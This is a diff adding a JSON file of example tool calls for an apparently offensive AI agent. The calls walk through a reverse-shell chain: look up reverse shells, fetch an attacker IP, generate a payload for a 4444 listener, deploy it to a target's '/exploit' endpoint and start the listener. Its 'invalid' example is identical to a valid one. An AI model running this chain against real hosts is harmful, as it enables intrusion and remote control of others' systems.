@@ -1,0 +1,122 @@
+{
+    "title": "Tool Call JSON Examples",
+    "tags": ["tool calling", "JSON structure", "examples"],
+    "category": "Tool Instruction Documentation",
+    "sections": [
+      {
+        "scenario": "Single tool call for querying KB",
+        "json_example": {
+          "tool_calls": [
+            {
+              "name": "query_kb",
+              "arguments": {
+                "query": "linux reverse shell",
+                "top_k": 5
+              }
+            }
+          ]
+        }
+      },
+      {
+        "scenario": "Sequential calls: Get IP first, then generate payload",
+        "json_example": {
+          "tool_calls": [
+            {
+              "name": "get_attacker_ip",
+              "arguments": {}
+            }
+          ]
+        },
+        "follow_up": {
+          "tool_calls": [
+            {
+              "name": "generate_payload",
+              "arguments": {
+                "os_type": "Linux",
+                "listener_ip": "192.168.1.100",
+                "listener_port": 4444
+              }
+            }
+          ]
+        }
+      },
+      {
+        "scenario": "Deploy payload after generation",
+        "json_example": {
+          "tool_calls": [
+            {
+              "name": "deploy_payload",
+              "arguments": {
+                "target_ip": "10.200.1.41",
+                "target_port": 80,
+                "endpoint": "/exploit"
+              }
+            }
+          ]
+        }
+      },
+      {
+        "scenario": "Start listener",
+        "json_example": {
+          "tool_calls": [
+            {
+              "name": "start_listener",
+              "arguments": {
+                "listener_port": 4444
+              }
+            }
+          ]
+        }
+      },
+      {
+        "scenario": "Multiple tools in one response",
+        "json_example": {
+          "tool_calls": [
+            {
+              "name": "query_kb",
+              "arguments": {
+                "query": "bash reverse shell",
+                "top_k": 10
+              }
+            },
+            {
+              "name": "get_attacker_ip",
+              "arguments": {}
+            }
+          ]
+        }
+      },
+      {
+        "scenario": "Try multiple payloads",
+        "json_example": {
+          "tool_calls": [
+            {
+              "name": "try_multiple_payloads",
+              "arguments": {
+                "os_type": "Linux",
+                "listener_ip": "192.168.1.100",
+                "listener_port": 4444,
+                "target_ip": "10.200.1.41",
+                "endpoint": "/exploit"
+              }
+            }
+          ]
+        }
+      },
+      {
+        "scenario": "Invalid example - no code in args",
+        "json_example": {
+          "tool_calls": [
+            {
+              "name": "generate_payload",
+              "arguments": {
+                "os_type": "Linux",
+                "listener_ip": "192.168.1.100",
+                "listener_port": 4444
+              }
+            }
+          ]
+        }
+      }
+    ]
+  }
